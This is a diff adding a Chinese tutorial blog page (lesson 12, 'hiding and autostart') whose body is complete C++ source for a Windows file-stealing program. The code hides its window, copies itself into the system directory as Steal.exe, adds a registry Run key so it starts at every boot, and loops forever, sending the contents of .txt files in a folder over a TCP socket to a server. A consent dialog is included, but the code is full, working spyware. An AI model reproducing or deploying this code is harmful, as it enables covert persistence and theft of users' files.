@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>12-文件截取：隐藏与自启动 | Yunyin&#39;s blog</title>
+  
+    <link rel="icon" href="/assert/C++.jpg">
+  
+  
+  
+  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+<div class="Shell">
+    <aside class='SideBar'>
+    <section class='avatar' style="background-image: url(/assets/background.jpg)">
+        <div class='av-pic' style="background-image: url(/assets/C++.jpg)">
+        </div>
+    </section>
+    <section class='menu'>
+        <div>Yunyin&#39;s blog</div>
+        
+        <ul>
+          
+            <a href="/" class="Btn">
+              <li>Home</li>
+            </a>  
+          
+            <a href="/archives/" class="Btn">
+              <li>Archive</li>
+            </a>  
+          
+            <a href="/tags/" class="Btn">
+              <li>Tags</li>
+            </a>  
+          
+            <a href="/categories/" class="Btn">
+              <li>Categories</li>
+            </a>  
+          
+        </ul>
+    </section>
+    <section class="media">
+        
+    </section>
+</aside>
+
+    <div class="container">
+        <div data-pager-shell>
+            <div>
+  <article class='ContentView'>
+    <header class='PageTitle'>
+        <h1>12-文件截取：隐藏与自启动</h1>
+    </header>
+
+    <section>
+      <h2 id="文件截取：隐藏与自启动">文件截取：隐藏与自启动</h2>
+<h4 id="1-隐藏自身">1.隐藏自身</h4>
+<span id="more"></span>
+<blockquote>
+<p>获取窗口句柄，将窗口设置为不可见</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">HideMyself</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HWND hwnd = <span class="built_in">GetForegroundWindow</span>();</span><br><span class="line">	<span class="built_in">ShowWindow</span>(hwnd, SW_HIDE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-自启动">2.自启动</h4>
+<blockquote>
+<p>调用函数时，修改exe的名称</p>
+<p>在不需要的时候，需要进入注册表的Software\Microsoft\Windows\CurrentVersion\Run里删除对应exe</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddToSystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HKEY hKEY;</span><br><span class="line">	<span class="type">char</span> CurrentPath[MAX_PATH];</span><br><span class="line">	<span class="type">char</span> SysPath[MAX_PATH];</span><br><span class="line">	<span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">	LPSTR FileNewName;</span><br><span class="line">	LPSTR FileCurrentName;</span><br><span class="line">	DWORD type = REG_SZ;</span><br><span class="line">	DWORD size = MAX_PATH;</span><br><span class="line">	LPCTSTR Rgspath = <span class="string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>; <span class="comment">//regedit win + R</span></span><br><span class="line">		<span class="built_in">GetSystemDirectory</span>(SysPath, size);</span><br><span class="line">	<span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, CurrentPath, size);</span><br><span class="line">	<span class="comment">//Copy File</span></span><br><span class="line">	FileCurrentName = CurrentPath;</span><br><span class="line">	FileNewName = <span class="built_in">lstrcat</span>(SysPath, <span class="string">&quot;\\Steal.exe&quot;</span>);</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">_finddata_t</span> Steal;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ret1 = %d,FileNewName = %s\n&quot;</span>, ret, FileNewName);</span><br><span class="line">	<span class="keyword">if</span> (_findfirst(FileNewName, &amp;Steal) != <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span>;<span class="comment">//已经安装！</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ret2 = %d\n&quot;</span>, ret);</span><br><span class="line">	<span class="type">int</span> ihow = <span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">&quot;该程序只允许用于合法的用途！\n 继续运行该程序将使这台机器\</span></span><br><span class="line"><span class="string">		处于被监控的状态！\n 如果您不想这样，请按“取消”按钮退出。\n 按下“是”按钮该程序将被复制\</span></span><br><span class="line"><span class="string">		到您的机器上，并随系统启动自动运行。\n 按下“否”按钮，程序只运行一次，不会在您的系统内留下\</span></span><br><span class="line"><span class="string">		任何东西。&quot;</span>, <span class="string">&quot;警告&quot;</span>, MB_YESNOCANCEL | MB_ICONWARNING | MB_TOPMOST);</span><br><span class="line">		<span class="keyword">if</span> (ihow == IDCANCEL)</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (ihow == IDNO)</span><br><span class="line">		<span class="keyword">return</span>;<span class="comment">//只运行一次</span></span><br><span class="line">		<span class="comment">//复制文件</span></span><br><span class="line">	ret = <span class="built_in">CopyFile</span>(FileCurrentName, FileNewName, TRUE);</span><br><span class="line">	<span class="keyword">if</span> (!ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//加入注册表</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ret = %d\n&quot;</span>, ret);</span><br><span class="line">	ret = <span class="built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, Rgspath, <span class="number">0</span>, KEY_WRITE, &amp;hKEY);</span><br><span class="line">	<span class="keyword">if</span> (ret != ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">RegCloseKey</span>(hKEY);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Set Key</span></span><br><span class="line">	ret = <span class="built_in">RegSetValueEx</span>(hKEY, <span class="string">&quot;Steal&quot;</span>, <span class="literal">NULL</span>, type, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)FileNewName, size);</span><br><span class="line">	<span class="keyword">if</span> (ret != ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">RegCloseKey</span>(hKEY);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">RegCloseKey</span>(hKEY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="完整代码">完整代码</h4>
+<blockquote>
+<p>使用管理员权限打开</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">initsocket</span><span class="params">()</span>		<span class="comment">//封装初始化网络库的函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WORD wVersionRequested;</span><br><span class="line">	WSADATA wsadata;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsadata);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsadata.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsadata.wVersion) != <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="built_in">WSACleanup</span>();</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">sendToServer</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">initsocket</span>())</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	FILE* fp = <span class="built_in">fopen</span>(path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="type">char</span> sendBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">fread</span>(sendBuf, <span class="number">1</span>, <span class="number">1024</span>, fp);</span><br><span class="line">	<span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line">	SOCKET sockCli;</span><br><span class="line">	sockCli = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	SOCKADDR_IN addrSrv;</span><br><span class="line">	addrSrv.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">	addrSrv.sin_family = AF_INET;</span><br><span class="line">	addrSrv.sin_port = <span class="built_in">htons</span>(<span class="number">9999</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(sockCli, (sockaddr*)&amp;addrSrv, <span class="built_in">sizeof</span>(sockaddr)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> iLen = <span class="built_in">send</span>(sockCli, sendBuf, <span class="number">1024</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">closesocket</span>(sockCli);</span><br><span class="line">	<span class="built_in">WSACleanup</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* szPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//1 遍历路径下所有文件夹</span></span><br><span class="line">	WIN32_FIND_DATA file_for_find;			<span class="comment">//文件数据</span></span><br><span class="line">	HANDLE hListFile;						<span class="comment">//用句柄来标志文件</span></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> szFilePath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">strcpy</span>(szFilePath, szPath);</span><br><span class="line">	<span class="built_in">strcat</span>(szFilePath, <span class="string">&quot;\\*&quot;</span>);</span><br><span class="line">	<span class="comment">//找到第一个文件</span></span><br><span class="line">	hListFile = <span class="built_in">FindFirstFile</span>(szFilePath, &amp;file_for_find);</span><br><span class="line">	<span class="comment">//循环遍历所有文件</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="type">char</span> mypath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		<span class="built_in">strcpy</span>(mypath, szPath);</span><br><span class="line">		<span class="built_in">strcat</span>(mypath, file_for_find.cFileName);</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">strstr</span>(mypath,<span class="string">&quot;.txt&quot;</span>))</span><br><span class="line">			<span class="keyword">while</span> (<span class="built_in">sendToServer</span>(mypath)==<span class="literal">false</span>);</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hListFile, &amp;file_for_find));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddToSystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HKEY hKEY;</span><br><span class="line">	<span class="type">char</span> CurrentPath[MAX_PATH];</span><br><span class="line">	<span class="type">char</span> SysPath[MAX_PATH];</span><br><span class="line">	<span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">	LPSTR FileNewName;</span><br><span class="line">	LPSTR FileCurrentName;</span><br><span class="line">	DWORD type = REG_SZ;</span><br><span class="line">	DWORD size = MAX_PATH;</span><br><span class="line">	LPCTSTR Rgspath = <span class="string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>; <span class="comment">//regedit win + R</span></span><br><span class="line">		<span class="built_in">GetSystemDirectory</span>(SysPath, size);</span><br><span class="line">	<span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, CurrentPath, size);</span><br><span class="line">	<span class="comment">//Copy File</span></span><br><span class="line">	FileCurrentName = CurrentPath;</span><br><span class="line">	FileNewName = <span class="built_in">lstrcat</span>(SysPath, <span class="string">&quot;\\Steal.exe&quot;</span>);</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">_finddata_t</span> Steal;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ret1 = %d,FileNewName = %s\n&quot;</span>, ret, FileNewName);</span><br><span class="line">	<span class="keyword">if</span> (_findfirst(FileNewName, &amp;Steal) != <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span>;<span class="comment">//已经安装！</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ret2 = %d\n&quot;</span>, ret);</span><br><span class="line">	<span class="type">int</span> ihow = <span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">&quot;该程序只允许用于合法的用途！\n 继续运行该程序将使这台机器\</span></span><br><span class="line"><span class="string">		处于被监控的状态！\n 如果您不想这样，请按“取消”按钮退出。\n 按下“是”按钮该程序将被复制\</span></span><br><span class="line"><span class="string">		到您的机器上，并随系统启动自动运行。\n 按下“否”按钮，程序只运行一次，不会在您的系统内留下\</span></span><br><span class="line"><span class="string">		任何东西。&quot;</span>, <span class="string">&quot;警告&quot;</span>, MB_YESNOCANCEL | MB_ICONWARNING | MB_TOPMOST);</span><br><span class="line">		<span class="keyword">if</span> (ihow == IDCANCEL)</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (ihow == IDNO)</span><br><span class="line">		<span class="keyword">return</span>;<span class="comment">//只运行一次</span></span><br><span class="line">		<span class="comment">//复制文件</span></span><br><span class="line">	ret = <span class="built_in">CopyFile</span>(FileCurrentName, FileNewName, TRUE);</span><br><span class="line">	<span class="keyword">if</span> (!ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//加入注册表</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ret = %d\n&quot;</span>, ret);</span><br><span class="line">	ret = <span class="built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, Rgspath, <span class="number">0</span>, KEY_WRITE, &amp;hKEY);</span><br><span class="line">	<span class="keyword">if</span> (ret != ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">RegCloseKey</span>(hKEY);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Set Key</span></span><br><span class="line">	ret = <span class="built_in">RegSetValueEx</span>(hKEY, <span class="string">&quot;Steal&quot;</span>, <span class="literal">NULL</span>, type, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)FileNewName, size);</span><br><span class="line">	<span class="keyword">if</span> (ret != ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">RegCloseKey</span>(hKEY);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">RegCloseKey</span>(hKEY);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HideMyself</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HWND hwnd = <span class="built_in">GetForegroundWindow</span>();</span><br><span class="line">	<span class="built_in">ShowWindow</span>(hwnd, SW_HIDE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">AddToSystem</span>();</span><br><span class="line">	<span class="built_in">HideMyself</span>();</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">		<span class="built_in">DoSteal</span>(<span class="string">&quot;D:\\文件合集\\txt合集\\&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+
+    </section>
+    
+      <section class='ArticleMeta'>
+          <div>
+            发布于&nbsp;
+            <time datetime="2023-03-14T16:00:00.000Z" itemprop="datePublished">
+              2023-03-15
+            </time>
+          </div>
+          
+      </section>
+    
+    
+      <section>
+        <div id="disqus_thread"></div>
+        <script>
+          window.disqus_config = function () {
+            this.page.url = window.location.toString()
+            this.page.identifier = window.location.pathname
+          }
+          if (typeof DISQUS === 'undefined') {
+            (function() { // DON'T EDIT BELOW THIS LINE
+              var d = document, s = d.createElement('script');
+              s.src = 'https://YunyinBlog.disqus.com/embed.js';
+              s.setAttribute('data-timestamp', +new Date());
+              (d.head || d.body).appendChild(s);
+            })();
+          } else {
+            DISQUS.reset({
+                reload: true,
+                config: window.disqus_config
+            })
+          }
+        </script>
+      </section>
+    
+</article>
+
+  
+</div>
+
+            <footer>
+    <div>© 2023 - Yunyin </div>
+    <div>
+        <span>
+            Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+        </span>
+        ,
+        <span>
+            Theme - <a target="_blank" rel="noopener" href="https://github.com/nameoverflow/hexo-theme-icalm">Icalm</a>
+        </span>
+    </div>
+</footer>
+
+        </div>
+    </div>
+</div>
+
+<script src="/js/pager/dist/singlepager.js"></script>
+
+<script>
+var sp = new Pager('data-pager-shell')
+
+</script>
+</body>
+</html>
